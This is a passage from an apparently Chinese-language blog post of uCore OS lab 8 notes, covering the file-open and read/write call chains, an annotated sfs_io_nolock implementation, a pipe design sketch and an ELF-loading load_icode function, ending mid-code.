</p><ul><li><p>device:/path  </p>  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/** 或者:</span><br><span class="hljs-comment">* we have either /path or :path</span><br><span class="hljs-comment">* /path is a path relative to the root of the &quot;boot filesystem&quot;</span><br><span class="hljs-comment">* :path is a path relative to the root of the current filesystem</span><br><span class="hljs-comment">* */</span><br></code></pre></div></td></tr></table></figure></li></ul></blockquote><p>首先贴一张函数调用图:</p><p><img src="../../image/ucore/Calls-file_open.png" alt="Calls-file_open"></p><p>基本上都有多路分支, 具体可以看源码, 这里讲个大概.</p><ul><li><p>通过用户libc库中的syscall调用sys_open, 一直到中断处理转到file_open.</p></li><li><p>这个函数就执行一个简单检查以及调用了vfs_open(最重要的函数)</p></li><li><p>如果一切正常, 只会执行vfs_lookup. </p><ul><li><p>第一个get_device是解析路径的, 如果path没有指定设备名称说明只是一个相对路径, 就会执行vfs_getdir</p></li><li><p>然后会调用sfs_lookup(通过宏定义), 通过path找到对应的inode, 下面是他的调用图</p><p><img src="../../image/ucore/image-20220108132923299.png" alt="image-20220108132923299"></p></li></ul></li></ul><h4 id="read-write-file"><a href="#read-write-file" class="headerlink" title="[read,write]file"></a>[read,write]file</h4><p>调用关系如下:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">sys_read(through syscall)-&gt;sys_fileread-&gt;file_read-&gt;vop_read(sfs_read)-&gt;sfs_io-&gt;sys_io_nolock<br></code></pre></div></td></tr></table></figure><ul><li>在<code>sysfile_read</code>里设置了一个4KB的buff, 主要调用了file_read函数将文件中的内容读取到<strong>内核</strong>buff中, 然后再调用copy_to_user()复制到用户空间.  每一次只会读取4096字节数据到buffer中, 然后继续下一次的填充缓冲区.<ul><li>copy_to_user()的原因是copy_to_user能够检查地址合法性和可用性. 比单纯的memcpy安全, 而且内核和用户地址空间的复制基本都是通过这个函数来完成的.</li></ul></li><li>file_read分配file结构体, 设置文件计数以及移动文件指针+缓冲区iobuf, 继续调用sfs_read-&gt;sfs_io(sfs_inode.c)</li><li>sfs_io通过第三个参数来判断是读还是写, 接着调用sfs_io_nolock</li><li>接下来就是练习的内容, read different kind of blocks in file</li></ul><blockquote><p>struct fs 包装了sfs_fs和一些对sfs_fs的操作</p><p>代码分析了一遍, 而且肖佬写的那几个部分都看过了, 实在是不想写那么多, 想看直接看现成的吧…[<a href="https://kiprey.github.io/2020/09/uCore-8/#9-uCore%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0">link</a>]</p></blockquote><p>基本看懂了, 写了一堆注释在源代码里面.(<code>sfs_inode.c:595</code>)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> * sfs_io_nolock - Rd/Wr a file content from offset position to offset+length disk blocks&lt;--&gt;buffer (in memroy)</span><br><span class="hljs-comment"> * @sfs:      sfs file system</span><br><span class="hljs-comment"> * @sin:      sfs inode in memory</span><br><span class="hljs-comment"> * @buf:      the buffer Rd/Wr</span><br><span class="hljs-comment"> * @offset:   the offset of file</span><br><span class="hljs-comment"> * @alenp:    the length need to read (is a pointer). and will RETURN the really Rd/Wr lenght</span><br><span class="hljs-comment"> * @write:    BOOL, 0 read, 1 write</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_io_nolock</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_inode *<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">off_t</span> offset, <span class="hljs-keyword">size_t</span> *alenp, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span> =</span> <span class="hljs-built_in">sin</span>-&gt;din;<br>    assert(din-&gt;type != SFS_TYPE_DIR);<br>    <span class="hljs-keyword">off_t</span> endpos = offset + *alenp, blkoff;<span class="hljs-comment">///endpos感觉恒等于4KB??好像不是</span><br>    *alenp = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// calculate the Rd/Wr end position</span><br>    <span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (offset == endpos) &#123;<span class="hljs-comment">///这是怎么发生的?</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE) &#123;<br>        endpos = SFS_MAX_FILE_SIZE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<span class="hljs-comment">///如果是read</span><br>        <span class="hljs-keyword">if</span> (offset &gt;= din-&gt;size) &#123;<span class="hljs-comment">///读完文件了</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (endpos &gt; din-&gt;size) &#123;<span class="hljs-comment">///不用读那么长, 只要din-&gt;size即可</span><br>            endpos = din-&gt;size;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">///下面这几行又是什么神奇操作, 这通用接口写的也太绝了</span><br>    <span class="hljs-keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset);<br>    <span class="hljs-keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks);<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">///如果是read, 要换成 把1个block读到buf 和 把多个block读到buf</span><br>        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> size, alen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">uint32_t</span> ino; <span class="hljs-comment">//the pointer of inode</span><br>    <span class="hljs-keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE;          <span class="hljs-comment">// The NO. of Rd/Wr begin block ///BUFFER不都是4KB的吗??</span><br>    <span class="hljs-keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="hljs-comment">// The size of Rd/Wr blocks</span><br><br>  <span class="hljs-comment">//LAB8:EXERCISE1 YOUR CODE HINT: call sfs_bmap_load_nolock, sfs_rbuf, sfs_rblock,etc. read different kind of blocks in file</span><br>    <span class="hljs-keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///如果在offset起始block的中间</span><br>        size = (nblks != <span class="hljs-number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);<br>        <span class="hljs-comment">///取出inode编号, 也即block编号, 因为一个block一个inode</span><br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///从block和其他信息读取到buf中</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<span class="hljs-comment">///要增加alen</span><br>        <span class="hljs-keyword">if</span> (nblks == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///如果只有一个block, 读/写就完成了</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        buf += size, blkno++, nblks--;<span class="hljs-comment">///否则修改一下剩余的参数</span><br>    &#125;<br><br>    size = SFS_BLKSIZE;<span class="hljs-comment">///使用while循环, 逐block读取, 到了剩余的整个block(nblock)等于0的时候退出</span><br>    <span class="hljs-keyword">while</span> (nblks != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size, buf += size, blkno++, nblks--;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///读取最后一个block的部分区域, 这三部分基本相同只能说</span><br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<br>    &#125;<br>out:<br>    *alenp = alen;<span class="hljs-comment">///上面要完成alen的赋值, 即真实的读取字节数目</span><br>    <span class="hljs-keyword">if</span> (offset + alen &gt; <span class="hljs-built_in">sin</span>-&gt;din-&gt;size) &#123;<span class="hljs-comment">///好像是用于write的</span><br>        <span class="hljs-built_in">sin</span>-&gt;din-&gt;size = offset + alen;<br>        <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p class="note note-primary" style="font-style:italic;background-color:rgb(240,230,250)">”UNIX的PIPE机制“的概要设计方案 </p><ul><li>PIPE管道机制是进程间通信的较为重要的一种方式。在VFS中，最简单的做法就是在磁盘上建立一块pipe缓冲文件<code>pipe_tmp</code>。之后，当打开了<code>pipe_tmp</code>文件的某进程fork出子进程后，父子进程就可以通过读写同一文件来实现进程间通信。</li><li>但实际上，上述的进程间通信是十分低效的，因为需要调用多个函数来完成文件读写，同时硬盘的读写速率也远远小于内存。由于用户与实际的文件系统间由虚拟文件系统VFS调控，因此我们可以在内存中根据文件系统规范，建立虚拟pipe缓冲区域文件来代替磁盘上的缓冲文件，这样便可大大提高通信速率。</li></ul><blockquote><p>在linux中PIPE的实现机制(at a high level):</p><ul><li>Linux has a VFS (virtual file system) module called pipefs, that gets mounted in kernel space during boot</li><li>pipefs is mounted alongside the root file system (<code>/</code>), not in it (pipe’s root is <code>pipe:</code>)</li><li>pipefs cannot be directly examined by the user unlike most file systems</li><li>The entry point to pipefs is the <code>pipe(2)</code> syscall</li><li>The <code>pipe(2)</code> syscall is used by shells and other programs to implement piping, and just creates a new file in pipefs, returning two file descriptors (one for the read end, opening using <code>O_RDONLY</code>, and one for the write end, opened using <code>O_WRONLY</code>)</li><li>pipefs is stored using an in-memory file system</li></ul></blockquote><h3 id="练习2-5"><a href="#练习2-5" class="headerlink" title="练习2"></a>练习2</h3><p>fork机制在原先lab7的基础上，多了<code>file_struct</code>结构的复制操作与执行失败时的重置操作。这两部操作分别需要调用<code>copy_files</code>和<code>put_files</code>函数</p><p><code>load_icode</code>中比较重要的是<code>load_icode_read()</code>, 可以根据ELF文件的特点使用偏移来移动当前文件的指针pos, 并且把内容读取到参数buf指向的空间中.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">load_icode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **kargv)</span> </span>&#123;<br>    <span class="hljs-comment">/* LAB8:EXERCISE2 YOUR CODE  HINT:how to load the file with handler fd  in to process&#x27;s memory? how to setup argc/argv?</span><br><span class="hljs-comment">     * MACROs or Functions:</span><br><span class="hljs-comment">     *  mm_create        - create a mm</span><br><span class="hljs-comment">     *  setup_pgdir      - setup pgdir in mm</span><br><span class="hljs-comment">     *  load_icode_read  - read raw data content of program file</span><br><span class="hljs-comment">     *  mm_map           - build new vma</span><br><span class="hljs-comment">     *  pgdir_alloc_page - allocate new memory for  TEXT/DATA/BSS/stack parts</span><br><span class="hljs-comment">     *  lcr3             - update Page Directory Addr Register -- CR3</span><br><span class="hljs-comment">     */</span><br><span class="hljs-comment">/* (1) create a new mm for current process</span><br><span class="hljs-comment">     * (2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT</span><br><span class="hljs-comment">     * (3) copy TEXT/DATA/BSS parts in binary to memory space of process</span><br><span class="hljs-comment">     *    (3.1) read raw data content in file and resolve elfhdr</span><br><span class="hljs-comment">     *    (3.2) read raw data content in file and resolve proghdr based on info in elfhdr</span><br><span class="hljs-comment">     *    (3.3) call mm_map to build vma related to TEXT/DATA</span><br><span class="hljs-comment">     *    (3.4) callpgdir_alloc_page to allocate page for TEXT/DATA, read contents in file</span><br><span class="hljs-comment">     *          and copy them into the new allocated pages</span><br><span class="hljs-comment">     *    (3.5) callpgdir_alloc_page to allocate pages for BSS, memset zero in these pages</span><br><span class="hljs-comment">     * (4) call mm_map to setup user stack, and put parameters into user stack</span><br><span class="hljs-comment">     * (5) setup current process&#x27;s mm, cr3, reset pgidr (using lcr3 MARCO)</span><br><span class="hljs-comment">     * (6) setup uargc and uargv in user stacks</span><br><span class="hljs-comment">     * (7) setup trapframe for user environment</span><br><span class="hljs-comment">     * (8) if up steps failed, you should cleanup the env.</span><br><span class="hljs-comment">     */</span><br>    assert(argc &gt;= <span class="hljs-number">0</span> &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM);<br><br>    <span class="hljs-keyword">if</span> (current-&gt;mm != <span class="hljs-literal">NULL</span>) &#123;<br>        panic(<span class="hljs-string">&quot;load_icode: current-&gt;mm must be empty.\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = -E_NO_MEM;<br>    <span class="hljs-comment">// 创建proc的内存管理结构</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-keyword">if</span> ((mm = mm_create()) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_mm;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (setup_pgdir(mm) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_pgdir_cleanup_mm;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-comment">// LAB8 这里要从文件中读取ELF header，而不是Lab7中的内存了</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elfhdr</span> __<span class="hljs-title">elf</span>, *<span class="hljs-title">elf</span> =</span> &amp;__elf;<br>    <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, elf, <span class="hljs-keyword">sizeof</span>(struct elfhdr), <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// 判断读取入的elf header是否正确</span><br>    <span class="hljs-keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;<br>        ret = -E_INVAL_ELF;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// 根据每一段的大小和基地址来分配不同的内存空间</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> __<span class="hljs-title">ph</span>, *<span class="hljs-title">ph</span> =</span> &amp;__ph;<br>    <span class="hljs-keyword">uint32_t</span> vm_flags, perm, phnum;<br>    <span class="hljs-keyword">for</span> (phnum = <span class="hljs-number">0</span>; phnum &lt; elf-&gt;e_phnum; phnum ++) &#123;<br>        <span class="hljs-comment">// LAB8 从文件特定偏移处读取每个段的详细信息（包括大小、基地址等等）</span><br>        <span class="hljs-keyword">off_t</span> phoff = elf-&gt;e_phoff + <span class="hljs-keyword">sizeof</span>(struct proghdr) * phnum;<br>        <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, ph, <span class="hljs-keyword">sizeof</span>(struct proghdr), phoff)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;<br>            ret = -E_INVAL_ELF;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        vm_flags = <span class="hljs-number">0</span>, perm = PTE_U;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;<br>        <span class="hljs-keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;<br>        <span class="hljs-comment">// 为当前段分配内存空间</span><br>        <span class="hljs-keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">off_t</span> offset = ph-&gt;p_offset;<br>        <span class="hljs-keyword">size_t</span> off, size;<br>        <span class="hljs-keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);<br><br>        ret = -E_NO_MEM;<br><br>        end = ph-&gt;p_va + ph-&gt;p_filesz;<br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-comment">// 设置该内存所对应的页表项</span><br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-comment">// LAB8 读取elf对应段内的数据并写入至该内存中</span><br>            <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            start += size, offset += size;<br>        &#125;<br>        end = ph-&gt;p_va + ph-&gt;p_memsz;<br>        <span class="hljs-comment">// 对于段中当前页中剩余的空间（复制elf数据后剩下的空间），将其置为0</span><br>        <span class="hljs-keyword">if</span> (start &lt; la) &#123;<br>            <span class="hljs-comment">/* ph-&gt;p_memsz == ph-&gt;p_filesz */</span><br>            <span class="hljs-keyword">if</span> (start == end) &#123;<br>                <span class="hljs-keyword">continue</span> ;<br>            &#125;<br>            off = start + PGSIZE - la, size = PGSIZE - off;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));<br>        &#125;<br>        <span class="hljs-comment">// 对于段中剩余页中的空间（复制elf数据后的多余页面），将其置为0</span><br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 关闭读取的ELF</span><br>    sysfile_close(fd);<br><br>    <span class="hljs-comment">// 设置栈内存</span><br>    vm_flags = VM_READ | VM_WRITE | VM_STACK;<br>    <span class="hljs-keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>    &#125;<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-2</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-3</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-4</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br><br>    mm_count_inc(mm);<br>    <span class="hljs-comment">// 设置CR3页表相关寄存器</span><br>    current-&gt;mm = mm;<br>    current-&gt;cr3 = PADDR(mm-&gt;pgdir);<br>    lcr3(PADDR(mm-&gt;pgdir));<br><br>    <span class="hljs-comment">//setup argc, argv</span><br>    <span class="hljs-comment">// LAB8 设置execve所启动的程序参数</span><br>    <span class="hljs-keyword">uint32_t</span> argv_size=<span 